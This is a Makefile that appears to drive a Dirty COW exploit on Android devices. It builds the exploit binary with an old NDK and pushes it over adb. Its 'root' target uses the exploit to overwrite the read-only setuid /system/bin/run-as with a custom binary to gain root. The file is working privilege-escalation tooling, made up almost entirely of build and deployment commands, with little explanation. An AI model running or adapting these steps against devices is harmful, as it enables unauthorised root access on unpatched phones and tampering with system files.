
# You can find an old NDK which supports the SDK of your android from here(since most devices affected by this are outdated by now)
# https://github.com/android/ndk/wiki/Unsupported-Downloads

# Make sure to change the path to the "ndk_build" file path
NDK_BUILD := /home/edllt/android_stuff/toolchains/android-ndk-r11c/ndk-build


# [OPTIONAL] You can pass additional arguments to ADB by setting the arg variable
#	Eg: If you have multiple android devices connected to your pc 
#		make test arg="-t 1"
arg :=

# Finding the ARCH and SDK_VERSION of your device by executing `adb shell getprop` then looking for
#  ro.product.cpu.abi and ro.build.version.sdk to find your ARCH and SDK_VERSION respectively

ARCH := $(shell adb $(arg) shell getprop ro.product.cpu.abi)
SDK_VERSION := $(shell adb $(arg) shell getprop ro.build.version.sdk)


all: build

build: clean
	$(NDK_BUILD) NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=$(ARCH) APP_PLATFORM=android-$(SDK_VERSION)

push: build
	adb $(arg) shell "mkdir /data/local/tmp/dirtycow_dir"
	adb $(arg) push libs/$(ARCH)/dirtycow /data/local/tmp/dirtycow_dir/dirtycow
	adb $(arg) shell 'chmod 777 /data/local/tmp/dirtycow_dir/dirtycow'
	adb $(arg) shell 'echo "" > /data/local/tmp/dirtycow_dir/o'


test: push
	adb $(arg) push test.sh /data/local/tmp/test.sh
	adb $(arg) shell 'chmod 777 /data/local/tmp/dirtycow_dir/dirtycow'
	adb $(arg) shell 'chmod 777 /data/local/tmp/test.sh'
	adb $(arg) shell '/data/local/tmp/test.sh'
	adb $(arg) shell '/data/local/tmp/dirtycow_dir/dirtycow /data/local/tmp/test /data/local/tmp/test2'
	adb $(arg) shell 'cat /data/local/tmp/test2'
	adb $(arg) shell 'cat /data/local/tmp/test2' | xxd

root: push
	adb $(arg) shell 'cat /system/bin/run-as > /data/local/tmp/dirtycow_dir/run-as-original'

	adb $(arg) shell 'chmod 777 /data/local/tmp/dirtycow_dir/dirtycow'
	adb $(arg) push libs/$(ARCH)/run-as /data/local/tmp/dirtycow_dir/run-as

	echo "[+] Writing empty file to /system/bin/run-as"
	adb $(arg) shell '/data/local/tmp/dirtycow_dir/dirtycow /data/local/tmp/dirtycow_dir/o /system/bin/run-as'
	echo "[+] Now writing custom run-as to /system/bin/run-as"
	adb $(arg) shell '/data/local/tmp/dirtycow_dir/dirtycow /data/local/tmp/dirtycow_dir/run-as /system/bin/run-as'

clean:
	rm -rf libs
	rm -rf obj

